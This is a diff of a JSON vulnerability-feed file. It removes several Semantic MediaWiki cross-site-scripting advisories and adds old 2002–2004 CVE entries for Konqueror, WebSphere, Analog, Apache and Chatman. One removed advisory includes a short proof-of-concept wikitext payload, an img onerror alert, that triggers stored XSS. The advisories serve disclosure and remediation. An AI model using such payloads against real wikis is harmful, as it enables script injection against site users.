-      "vulnerableProducts": [
-        "mediawiki/semantic-media-wiki composer"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-77607",
-      "summary": "#### Failure mode\n\n`sep` was inserted verbatim into the HTML that joins a table cell's values. This made it possible to inject HTML through the separator value. The same unsanitised table HTML is produced both for the standard `Special:Ask` render and for its raw request output (`request_type=raw`), so the injection was reachable without authentication.\n\n#### Remediation\n\n- In all non-wiki output modes (HTML, raw request, file), `sep` is escaped unless it is a safe `<br>` variant.\n- This preserves legitimate line-break separators while blocking markup injection.\n\n#### Maintenance note\n\nIf the table renderer ever gains richer separator semantics, keep the whitelist explicit. Do not expand the allowed HTML surface casually.",
-      "cvssScore": 6.1,
-      "severity": "Medium",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
-      "cwe": {
-        "cwe_id": "CWE-79",
-        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
-      },
-      "references": [
-        "https://github.com/SemanticMediaWiki/SemanticMediaWiki/security/advisories/GHSA-7xv3-gf2g-498h",
-        "https://github.com/SemanticMediaWiki/SemanticMediaWiki/releases/tag/7.2.0",
-        "https://github.com/advisories/GHSA-7xv3-gf2g-498h"
-      ],
-      "vulnerableProducts": [
-        "mediawiki/semantic-media-wiki composer"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-77608",
-      "summary": "#### Failure mode\n\nThe `value` parameter was reflected back into rendered output and error messaging paths without enough output-context encoding.\n\n#### Remediation\n\n- The form value is escaped before it is placed back into the input field.\n- Derived error messages are also escaped before being rendered into HTML.\n\n#### Maintenance note\n\nDo not treat error text as trusted just because it originated from validation. Validation output can still be attacker-influenced.",
-      "cvssScore": 6.1,
-      "severity": "Medium",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
-      "cwe": {
-        "cwe_id": "CWE-79",
-        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
-      },
-      "references": [
-        "https://github.com/SemanticMediaWiki/SemanticMediaWiki/security/advisories/GHSA-59xw-qv23-j3rc",
-        "https://github.com/SemanticMediaWiki/SemanticMediaWiki/releases/tag/7.2.0",
-        "https://github.com/advisories/GHSA-59xw-qv23-j3rc"
-      ],
-      "vulnerableProducts": [
-        "mediawiki/semantic-media-wiki composer"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-77606",
-      "summary": "#### Failure mode\n\nWhen `headers=plain`, table header text was emitted into `<th>` via a raw HTML path. User-controlled `mainlabel` content could therefore become executable HTML.\n\n#### Remediation\n\n- `TableResultPrinter` now applies output-context escaping before passing plain headers to the table renderer.\n- The fix is limited to the HTML/plain-header branch so safe rendering modes are unaffected.\n\n#### Why this is the right layer\n\nThe header value is not a structural token; it is display data. Sanitizing it at the sink is correct because the renderer owns the final HTML emission.",
-      "cvssScore": 6.1,
-      "severity": "Medium",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
-      "cwe": {
-        "cwe_id": "CWE-79",
-        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
-      },
-      "references": [
-        "https://github.com/SemanticMediaWiki/SemanticMediaWiki/security/advisories/GHSA-3jp5-3h47-28qf",
-        "https://github.com/SemanticMediaWiki/SemanticMediaWiki/releases/tag/7.2.0",
-        "https://github.com/advisories/GHSA-3jp5-3h47-28qf"
-      ],
-      "vulnerableProducts": [
-        "mediawiki/semantic-media-wiki composer"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2025-61682",
-      "summary": "### Summary\nThe SemanticMediaWiki extension inserts the unsanitized value of a data attribute into the DOM as HTML, allowing for stored XSS through wikitext.\n\n### Details\n\nIn `ext.smw.js`, the `data-subtab` attribute of all elements with the `smw-subtab` class is parsed as JSON and appended to the `innerHTML` of the element:\nhttps://github.com/SemanticMediaWiki/SemanticMediaWiki/blob/62f1fa765b626e21d88999b97a3e8029db9fd385/res/smw/ext.smw.js#L37-L42\nHowever, most data attributes (except for reserved ones) like `data-subtab` can be used in wikitext. Therefore, it is possible to insert arbitrary HTML and JS through wikitext.\nThe decoded (`\"` will turn to `&quot;`, but it will be decoded when it is retrieved through `.dataset`) value of the `data-subtab` attribute in the payload is `\"<img src='' onerror=alert(1)>\"`. This is valid JSON and returns a string with `<img src='' onerror=alert(1)>` when being decoded.\n\n### PoC\n\n1. Create a page with the following contents:\n```html\n{{#tag:div|\n|class=smw-subtab\n|data-subtab=\"\"<img src='' onerror=alert(1)>\"\"\n}}\n```\n2. Visit the page\n\n<img width=\"991\" height=\"465\" alt=\"image\" src=\"https://github.com/user-attachments/assets/5d28d852-72d6-41dc-a59a-faac1610015f\" />\n<img width=\"497\" height=\"69\" alt=\"image\" src=\"https://github.com/user-attachments/assets/02309390-0b40-46d9-b690-de8cd25dba59\" />\n\n### Impact\n\nArbitrary HTML can be inserted into the DOM by any user with the `edit` right, allowing for JavaScript to be executed.",
-      "cvssScore": 8.6,
+      "id": "CVE-2002-1152",
+      "summary": "Konqueror in KDE 3.0 through 3.0.2 does not properly detect the \"secure\" flag in an HTTP cookie, which could cause Konqueror to send the cookie across an unencrypted channel, which could allow remote attackers to steal the cookie via sniffing.",
+      "cvssScore": 7.5,
       "severity": "High",
-      "published": "2026-09-18",
-      "modified": "2026-09-18",
-      "cwe": {
-        "cwe_id": "CWE-79",
-        "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
-      },
+      "published": "2002-10-11",
+      "modified": null,
+      "cwe": null,
       "references": [
-        "https://github.com/SemanticMediaWiki/SemanticMediaWiki/security/advisories/GHSA-hg8h-557g-q8pp",
-        "https://github.com/SemanticMediaWiki/SemanticMediaWiki/releases/tag/7.0.0",
-        "https://github.com/advisories/GHSA-hg8h-557g-q8pp"
+        "http://marc.info/?l=bugtraq&m=103175827225044&w=2",
+        "http://www.iss.net/security_center/static/10083.php",
+        "http://www.kde.org/info/security/advisory-20020908-1.txt",
+        "http://www.redhat.com/support/errata/RHSA-2002-220.html",
+        "http://www.securityfocus.com/bid/5691"
       ],
-      "vulnerableProducts": [
-        "mediawiki/semantic-media-wiki composer"
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1153",
+      "summary": "IBM Websphere 4.0.3 allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via an HTTP request with long HTTP headers, such as \"Host\".",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-10-11",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "ftp://ftp.software.ibm.com/software/websphere/appserv/support/fixes/pq62144/readme.txt",
+        "http://marc.info/?l=bugtraq&m=103244572803950&w=2",
+        "http://www.iss.net/security_center/static/10140.php",
+        "http://www.osvdb.org/2092",
+        "http://www.securityfocus.com/bid/5749"
       ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1154",
+      "summary": "anlgform.pl in Analog before 5.23 does not restrict access to the PROGRESSFREQ progress update command, which allows remote attackers to cause a denial of service (disk consumption) by using the command to report updates more frequently and fill the web server error log.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-10-11",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.analog.cx/security5.html",
+        "http://www.iss.net/security_center/static/10344.php",
+        "http://www.osvdb.org/3779",
+        "http://www.redhat.com/support/errata/RHSA-2002-059.html",
+        "http://www.analog.cx/security5.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-1156",
+      "summary": "Apache 2.0.42 allows remote attackers to view the source code of a CGI script via a POST request to a directory with both WebDAV and CGI enabled.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-10-11",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://online.securityfocus.com/advisories/4617",
+        "http://www.apache.org/dist/httpd/CHANGES_2.0",
+        "http://www.apacheweek.com/issues/02-10-04",
+        "http://www.kb.cert.org/vuls/id/910713",
+        "http://www.securityfocus.com/bid/6065"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-2151",
+      "summary": "Chatman 1.1.1 RC1 and earlier allows remote attackers to cause a denial of service (memory consumption or application crash) via a very large data size.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2004-12-31",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://secunia.com/advisories/12665/",
+        "http://securitytracker.com/id?1011431",
+        "http://www.osvdb.org/10365",
+        "http://www.securityfocus.com/archive/1/376569",
+        "http://www.securityfocus.com/bid/11263"
+      ],
+      "vulnerableProducts": [],
       "isExploited": false
     }
   ]
